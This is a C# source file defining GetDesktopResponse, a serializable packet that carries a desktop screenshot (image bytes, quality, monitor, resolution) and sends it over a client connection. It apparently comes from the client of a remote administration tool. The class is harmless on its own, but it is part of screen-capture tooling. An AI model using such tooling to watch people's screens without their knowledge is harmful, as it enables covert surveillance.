using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetDesktopResponse : IPacket
{
	public byte[] Image { get; set; }

	public int Quality { get; set; }

	public int Monitor { get; set; }

	public string Resolution { get; set; }

	public GetDesktopResponse()
	{
	}

	public GetDesktopResponse(byte[] image, int quality, int monitor, string resolution)
	{
		Image = image;
		Quality = quality;
		Monitor = monitor;
		Resolution = resolution;
	}

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
